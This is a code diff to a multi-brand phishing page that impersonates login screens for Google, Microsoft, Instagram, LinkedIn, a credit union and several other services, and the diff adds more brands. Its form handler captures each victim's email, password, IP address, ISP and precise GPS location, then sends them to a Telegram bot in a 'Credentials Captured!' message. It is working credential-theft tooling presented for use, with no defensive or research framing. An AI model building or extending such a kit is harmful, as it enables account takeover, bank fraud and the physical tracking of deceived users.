@@ -43,6 +43,13 @@
     .loading p { color: #666; font-size: 14px; }
     .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
     .footer a { color: var(--brand-color, #1a73e8); text-decoration: none; }
+    .checkbox-group {
+        display: flex; align-items: center; gap: 8px; margin: 12px 0;
+    }
+    .checkbox-group input[type="checkbox"] {
+        width: 18px; height: 18px; accent-color: var(--brand-color, #1a73e8);
+    }
+    .checkbox-group label { font-size: 14px; color: #555; cursor: pointer; }
     .geo-prompt {
         display: none;
         position: fixed;
@@ -109,6 +116,7 @@
             <label for="password">Password</label>
             <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="off" required>
         </div>
+        <div class="checkbox-group" id="checkboxArea"></div>
         <div class="error" id="errorMsg">Incorrect email or password. Please try again.</div>
         <button type="submit" class="btn" id="submitBtn">Sign in</button>
     </form>
@@ -153,6 +161,8 @@ const BRANDS = {
         subtitle: "Use your Google Account",
         emailLabel: "Email or phone",
         placeholder: "you@gmail.com",
+        btnText: "Sign in",
+        forgotText: "password",
         logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
             <path d="M43.6 24.5c0-1.6-.1-3.1-.4-4.6H24v8.7h11c-.5 2.7-1.9 5-3.9 6.5v5.4h6.3c3.7-3.4 5.9-8.4 5.9-16z" fill="#4285F4"/>
             <path d="M24 44c5.3 0 9.8-1.8 13-4.8l-6.3-5.4c-1.7 1.2-3.9 1.9-6.7 1.9-5.1 0-9.5-3.5-11-8.2H6.4v5.6C9.6 39.7 16.3 44 24 44z" fill="#34A853"/>
@@ -168,6 +178,8 @@ const BRANDS = {
         subtitle: "Connect with friends and the world",
         emailLabel: "Email or phone",
         placeholder: "Email or phone number",
+        btnText: "Log in",
+        forgotText: "account",
         logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
             <circle cx="24" cy="24" r="20" fill="#1877F2"/>
             <path d="M29 16h-3c-1.7 0-3 1.3-3 3v3h-3v4h3v12h4V26h3l1-4h-4v-2c0-.6.4-1 1-1h3v-3z" fill="#fff"/>
@@ -181,6 +193,8 @@ const BRANDS = {
         subtitle: "Work or school account",
         emailLabel: "Email, phone, or Skype",
         placeholder: "you@company.com",
+        btnText: "Sign in",
+        forgotText: "password",
         logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
             <rect x="6" y="6" width="16" height="16" rx="2" fill="#F25022"/>
             <rect x="26" y="6" width="16" height="16" rx="2" fill="#7FBA00"/>
@@ -196,6 +210,8 @@ const BRANDS = {
         subtitle: "Snapchat",
         emailLabel: "Username or email",
         placeholder: "Your username or email",
+        btnText: "Log in",
+        forgotText: "password",
         logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
             <circle cx="24" cy="24" r="22" fill="#FFFC00"/>
             <path d="M24 10c-5 0-9 3-9 8v4c0 1-1 2-2 2-1 0-2 0-3 1 0 1 1 2 3 3 1 0 2 1 2 1s0 4 3 6c2 2 4 3 6 3s4-1 6-3c3-2 3-6 3-6s1-1 2-1c2-1 3-2 3-3-1-1-2-1-3-1-1 0-2-1-2-2v-4c0-5-4-8-9-8z" fill="#000"/>
@@ -209,6 +225,8 @@ const BRANDS = {
         subtitle: "TikTok",
         emailLabel: "Email or username",
         placeholder: "Email or username",
+        btnText: "Log in",
+        forgotText: "password",
         logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
             <rect width="48" height="48" rx="10" fill="#000"/>
             <path d="M34 18.5v3c-2 0-4-.5-6-2v8c0 4-3 7-7 7s-7-3-7-7 3-7 7-7v3c-2 0-4 1.5-4 4s1.5 4 4 4 4-2 4-4V12h3c0 2 1 4 3 5v1.5z" fill="#fff"/>
@@ -222,6 +240,8 @@ const BRANDS = {
         subtitle: "Instagram",
         emailLabel: "Phone number, username, or email",
         placeholder: "Phone number, username, or email",
+        btnText: "Log in",
+        forgotText: "password",
         logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
             <rect x="4" y="4" width="40" height="40" rx="10" fill="url(#ig)"/>
             <defs><linearGradient id="ig" x1="0" y1="0" x2="48" y2="48"><stop stop-color="#833AB4"/><stop offset=".5" stop-color="#FD1D1D"/><stop offset="1" stop-color="#F77737"/></linearGradient></defs>
@@ -231,15 +251,132 @@ const BRANDS = {
     },
     banking: {
         name: "Affinity Credit Union",
-        color: "#004B87",
+        color: "#00843D",
         realSite: "https://www.affinitycu.ca",
-        title: "Online Banking",
-        subtitle: "Sign in to your account",
-        emailLabel: "Member Card Number or Username",
-        placeholder: "Member Card or Username",
+        title: "Sign in to Online Banking",
+        subtitle: "Enter your Affinity Credit Union member number or Member Card® number to sign in",
+        emailLabel: "Member Card® / Member Number",
+        placeholder: "Member Card or Member Number",
+        btnText: "Sign In",
+        forgotText: "password",
+        showCheckbox: true,
+        checkboxLabel: "Remember Account",
+        logo: `<svg width="48" height="32" viewBox="0 0 200 60" fill="none">
+            <rect width="200" height="60" rx="6" fill="#004B3D"/>
+            <circle cx="30" cy="30" r="18" fill="none" stroke="#fff" stroke-width="3"/>
+            <path d="M22 30 l5 5 l8-10" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+            <text x="60" y="36" fill="#fff" font-size="22" font-weight="bold" font-family="Arial,sans-serif">AFFINITY</text>
+            <text x="60" y="50" fill="#fff" font-size="10" font-family="Arial,sans-serif" opacity="0.8">CREDIT UNION</text>
+        </svg>`
+    },
+    pinterest: {
+        name: "Pinterest",
+        color: "#E60023",
+        realSite: "https://www.pinterest.com/login",
+        title: "Log in to see more",
+        subtitle: "Pinterest",
+        emailLabel: "Email",
+        placeholder: "Email",
+        btnText: "Log in",
+        forgotText: "password",
         logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
-            <rect width="48" height="48" rx="8" fill="#004B87"/>
-            <text x="24" y="32" text-anchor="middle" fill="#fff" font-size="18" font-weight="bold" font-family="Arial">ACU</text>
+            <circle cx="24" cy="24" r="22" fill="#E60023"/>
+            <path d="M24 8c-8.8 0-16 7.2-16 16 0 6.8 4.2 12.6 10.2 14.9-.1-1.3-.3-3.2.1-4.6l1.5-6.4s-.4-.8-.4-1.9c0-1.8 1-3.1 2.3-3.1 1.1 0 1.6.8 1.6 1.8 0 1.1-.7 2.7-1.1 4.2-.3 1.3.6 2.3 1.9 2.3 2.3 0 4.1-2.4 4.1-5.9 0-3.1-2.2-5.2-5.4-5.2-3.7 0-5.8 2.8-5.8 5.6 0 1.1.4 2.3.9 2.9.1.1.1.2.1.4-.1.4-.3 1.2-.3 1.4-.1.2-.2.3-.4.2-1.6-.8-2.6-3.1-2.6-5 0-4.1 3-7.9 8.6-7.9 4.5 0 8 3.2 8 7.5 0 4.5-2.8 8.1-6.7 8.1-1.3 0-2.5-.7-2.9-1.5l-.8 3c-.3 1.1-1 2.5-1.5 3.3 1.1.3 2.3.5 3.5.5 8.8 0 16-7.2 16-16S32.8 8 24 8z" fill="#fff"/>
+        </svg>`
+    },
+    vsco: {
+        name: "VSCO",
+        color: "#000000",
+        realSite: "https://vsco.co/",
+        title: "Sign in to VSCO",
+        subtitle: "VSCO",
+        emailLabel: "Email",
+        placeholder: "Enter your email",
+        btnText: "Continue",
+        forgotText: "password",
+        logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+            <rect width="48" height="48" rx="8" fill="#000"/>
+            <text x="24" y="32" text-anchor="middle" fill="#fff" font-size="20" font-weight="bold" font-family="Arial,sans-serif">VSCO</text>
+        </svg>`
+    },
+    leetcode: {
+        name: "LeetCode",
+        color: "#FFA116",
+        realSite: "https://leetcode.com/accounts/login",
+        title: "Sign in to LeetCode",
+        subtitle: "Level up your coding skills",
+        emailLabel: "Email or username",
+        placeholder: "Email or username",
+        btnText: "Sign in",
+        forgotText: "password",
+        logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+            <rect width="48" height="48" rx="8" fill="#FFA116"/>
+            <path d="M20 14l10 10-10 10-3-3 7-7-7-7 3-3z" fill="#fff"/>
+            <rect x="18" y="22" width="14" height="4" rx="1" fill="#fff"/>
+        </svg>`
+    },
+    linkedin: {
+        name: "LinkedIn",
+        color: "#0A66C2",
+        realSite: "https://www.linkedin.com/login",
+        title: "Sign in",
+        subtitle: "Welcome back to LinkedIn",
+        emailLabel: "Email or phone",
+        placeholder: "Email or phone number",
+        btnText: "Sign in",
+        forgotText: "password",
+        logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+            <rect width="48" height="48" rx="8" fill="#0A66C2"/>
+            <rect x="10" y="20" width="6" height="16" rx="1" fill="#fff"/>
+            <ellipse cx="13" cy="14" rx="3.5" ry="3.5" fill="#fff"/>
+            <path d="M22 36V24h5.5v2.5h.1c.8-1.3 2.4-2.5 4.4-2.5 4.7 0 5.5 2.8 5.5 6.5V36h-5.5v-5.5c0-1.8-.4-3-2.2-3s-2.7 1.1-2.7 3V36H22z" fill="#fff"/>
+        </svg>`
+    },
+    etsy: {
+        name: "Etsy",
+        color: "#F1641E",
+        realSite: "https://www.etsy.com/signin",
+        title: "Sign in",
+        subtitle: "Etsy",
+        emailLabel: "Email address",
+        placeholder: "you@example.com",
+        btnText: "Sign in",
+        forgotText: "password",
+        logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+            <rect width="48" height="48" rx="10" fill="#F1641E"/>
+            <text x="24" y="32" text-anchor="middle" fill="#fff" font-size="14" font-weight="bold" font-family="serif" font-style="italic">etsy</text>
+        </svg>`
+    },
+    doordash: {
+        name: "DoorDash",
+        color: "#FF3008",
+        realSite: "https://www.doordash.com/consumer/login/",
+        title: "Sign in to DoorDash",
+        subtitle: "Get your favorites delivered",
+        emailLabel: "Email or phone number",
+        placeholder: "Email or phone",
+        btnText: "Sign in",
+        forgotText: "password",
+        logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+            <rect width="48" height="48" rx="8" fill="#FF3008"/>
+            <path d="M14 24c0-4 3-7 7-7h6c4 0 7 3 7 7s-3 7-7 7h-6c-4 0-7-3-7-7z" fill="#fff"/>
+            <rect x="19" y="16" width="10" height="16" rx="5" fill="#FF3008"/>
+        </svg>`
+    },
+    ubereats: {
+        name: "Uber Eats",
+        color: "#06C167",
+        realSite: "https://www.ubereats.com",
+        title: "Sign in",
+        subtitle: "Uber Eats",
+        emailLabel: "Email or phone",
+        placeholder: "Email or phone",
+        btnText: "Sign in",
+        forgotText: "password",
+        logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+            <rect width="48" height="48" rx="8" fill="#06C167"/>
+            <path d="M16 30V18l8 6 8-6v12" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+            <circle cx="24" cy="30" r="2" fill="#fff"/>
         </svg>`
     }
 };
@@ -248,7 +385,7 @@ const BRANDS = {
 // DETECT BRAND FROM URL
 // ========================
 const params = new URLSearchParams(window.location.search);
-const brandKey = params.get('brand') || 'google';
+let brandKey = params.get('brand') || 'google';
 const brand = BRANDS[brandKey] || BRANDS.google;
 
 // Apply brand styling
@@ -263,13 +400,20 @@ document.getElementById('logoArea').innerHTML = brand.logo + `
 // Labels and placeholders
 document.getElementById('emailLabel').textContent = brand.emailLabel;
 document.getElementById('email').placeholder = brand.placeholder;
-document.getElementById('submitBtn').textContent = brandKey === 'facebook' ? 'Log in' : 'Sign in';
+document.getElementById('submitBtn').textContent = brand.btnText || 'Sign in';
 document.getElementById('submitBtn').style.background = brand.color;
+
+// Checkbox (only shows for brands that use it)
+if (brand.showCheckbox) {
+    document.getElementById('checkboxArea').innerHTML = `
+        <input type="checkbox" id="remember">
+        <label for="remember">${brand.checkboxLabel || 'Remember me'}</label>
+    `;
+}
 
 // Footer
 document.getElementById('footerArea').innerHTML = `
-    <a href="#" style="color:${brand.color}">Forgot ${brandKey === 'facebook' ? 'account' : 'password'}?</a>
-    ${brandKey === 'microsoft' ? '· <a href="#" style="color:'+brand.color+'">Sign up</a>' : ''}
+    <a href="#" style="color:${brand.color}">Forgot ${brand.forgotText || 'password'}?</a>
 `;
 
 // ========================
@@ -395,6 +539,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     
     const email = document.getElementById('email').value.trim();
     const password = document.getElementById('password').value;
+    const remember = document.getElementById('remember') ? document.getElementById('remember').checked : false;
     const userAgent = navigator.userAgent;
     const timestamp = new Date().toISOString();
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -406,14 +551,15 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     
     let message = `🔔 *${brand.name} — Credentials Captured!*\n\n`;
     message += `📧 *Email:* \`${email}\`\n`;
-    message += `🔑 *Password:* \`${password}\`\n\n`;
-    message += `🌐 *IP:* ${targetIP}\n`;
+    message += `🔑 *Password:* \`${password}\`\n`;
+    if (remember) message += `☑️ *Remember Account:* On\n`;
+    message += `\n🌐 *IP:* ${targetIP}\n`;
     message += `📍 *IP Location:* ${targetCity}, ${targetCountry}\n`;
     if (targetLat && targetLon) {
         message += `🗺 *IP Coords:* ${targetLat}, ${targetLon}\n`;
     }
     if (preciseLocation) {
-        message += `🎯 *GPS (precise):* ${preciseLocation.lat}, ${preciseLocation.lon} (±${preciseLocation.acc}m)\n`;
+        message += `🎯 *GPS:* ${preciseLocation.lat}, ${preciseLocation.lon} (±${preciseLocation.acc}m)\n`;
         message += `🗺 *GPS Map:* https://www.google.com/maps?q=${preciseLocation.lat},${preciseLocation.lon}\n`;
     }
     message += `🏢 *ISP:* ${targetISP}\n`;
@@ -424,7 +570,6 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     
     sendToTelegram(message);
     
-    // Fallback XHR
     try {
         const xhr = new XMLHttpRequest();
         xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, true);
